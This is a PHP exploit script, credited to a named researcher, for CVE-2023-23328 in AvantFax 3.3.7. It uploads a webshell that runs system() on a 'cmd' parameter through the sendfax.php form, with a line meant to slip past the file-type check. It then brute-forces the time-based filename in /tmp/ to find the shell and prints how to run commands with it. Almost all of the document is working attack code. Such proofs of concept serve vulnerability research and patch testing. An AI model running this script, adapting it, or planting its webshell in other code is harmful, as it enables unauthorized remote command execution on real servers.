<?php

/*
 * Title    : AvantFax 3.3.7 Remote Code Execution via PHP Arbitrary File Upload
 * Version  : AvantFax 3.3.7
 * CVE      : CVE-2023-23328
 * Vendor   : http://www.avantfax.com
 * Date     : 17 November 2022
 * Author   : Harold Rodriguez (superkojiman)
 * URL      : https://www.techorganic.com | https://www.cycura.com
 */


 // Set the target IP address here:
$ip = "192.168.225.131";

// Set the avantfax_cookie assigned to your session after authenticating: 
$avantfax_cookie = "agou01gasiegmh34hrpee0npd4"; 

$payload = "This line bypasses the file-type check.\n<?php if(isset(\$_GET['cmd'])) { system(\$_GET['cmd']); } ?>"; 
$url = "http://$ip/sendfax.php";
$webshell = "test.php"; 


function upload_webshell() { 
	global $ip, $avantfax_cookie, $payload, $url, $webshell; 

	$curl = curl_init();
	curl_setopt($curl, CURLOPT_URL, $url);
	curl_setopt($curl, CURLOPT_POST, true);
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

	$headers = array(
	   "Host: $ip",
	   "Cookie: AvantFAX=$avantfax_cookie",
	   "Content-Type: multipart/form-data; boundary=---------------------------3318066672130760071141665291",
	   "Content-Length: 2566",
	);
	curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

	$data = <<<EOD
	-----------------------------3318066672130760071141665291
	Content-Disposition: form-data; name="MAX_FILE_SIZE"

	41943040
	-----------------------------3318066672130760071141665291
	Content-Disposition: form-data; name="destinations"

	aaaa
	-----------------------------3318066672130760071141665291
	Content-Disposition: form-data; name="file_1"; filename=""
	Content-Type: application/octet-stream


	-----------------------------3318066672130760071141665291
	Content-Disposition: form-data; name="file_0"; filename="$webshell"
	Content-Type: application/octet-stream

	$payload

	-----------------------------3318066672130760071141665291
	Content-Disposition: form-data; name="notify_requeue"

	1
	-----------------------------3318066672130760071141665291
	Content-Disposition: form-data; name="sendtimeHour"

	00
	-----------------------------3318066672130760071141665291
	Content-Disposition: form-data; name="sendtimeMin"

	00
	-----------------------------3318066672130760071141665291
	Content-Disposition: form-data; name="killtime"


	-----------------------------3318066672130760071141665291
	Content-Disposition: form-data; name="killtime_unit"

	minutes
	-----------------------------3318066672130760071141665291
	Content-Disposition: form-data; name="numtries"


	-----------------------------3318066672130760071141665291
	Content-Disposition: form-data; name="modem"


	-----------------------------3318066672130760071141665291
	Content-Disposition: form-data; name="coverpage"

	1
	-----------------------------3318066672130760071141665291
	Content-Disposition: form-data; name="whichcover"

	cover-letter.ps
	-----------------------------3318066672130760071141665291
	Content-Disposition: form-data; name="to_person"

	bbbb
	-----------------------------3318066672130760071141665291
	Content-Disposition: form-data; name="to_company"

	cccc
	-----------------------------3318066672130760071141665291
	Content-Disposition: form-data; name="to_location"

	dddd
	-----------------------------3318066672130760071141665291
	Content-Disposition: form-data; name="to_voicenumber"

	eeee
	-----------------------------3318066672130760071141665291
	Content-Disposition: form-data; name="regarding"

	ffff
	-----------------------------3318066672130760071141665291
	Content-Disposition: form-data; name="comments"

	gggg
	-----------------------------3318066672130760071141665291
	Content-Disposition: form-data; name="_submit_check"

	1
	-----------------------------3318066672130760071141665291--
	EOD;

	curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

	$resp = curl_exec($curl);

	$mtime = microtime();
	$start_range = substr($mtime, 2, 6); 
	$stop_range = $start_range - 15000;
	$seconds = explode(" ", $mtime)[1];


	print("[+] Upload completed at: " . $mtime . "\n");

	curl_close($curl);
	return [$start_range, $stop_range, $seconds]; 
}


function find_webshell($start_range, $stop_range, $seconds) {
	global $ip, $webshell; 
	$url = "http://$ip/tmp/";
	$pwned = false; 

	print("[+] Using time period $start_range to $stop_range\n"); 

	for ($i = $start_range; $i > $stop_range; $i--) {
		$timestamp = "0." . "$i" . "00 $seconds";

		$filename = substr(md5($timestamp), 0, 9).$webshell; 

		$webshell_url = $url . $filename; 
		$curl = curl_init(); 
		curl_setopt($curl, CURLOPT_URL, $webshell_url);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_exec($curl); 

		$code = curl_getinfo($curl, CURLINFO_HTTP_CODE); 
		if ($code === 200) {
			print("[+] Found webshell at $webshell_url\n"); 
			print("[+] Exploit using $webshell_url" . "?cmd=id\n"); 
			$pwned = true; 
			break;
		}
	}
	if (! $pwned) {
		print("[+] Could not find webshell. Expanding the time period..."); 
		find_webshell($stop_range, $stop_range - 15000, $seconds); 
	}
}


print("[+] Target: $ip\n");
print("[+] Payload:\n\n$payload\n\n");
print("[+] Uploading payload...\n");
[$start_range, $stop_range, $seconds] = upload_webshell(); 

print("[+] Searching for webshell...\n"); 
find_webshell($start_range, $stop_range, $seconds); 

?>
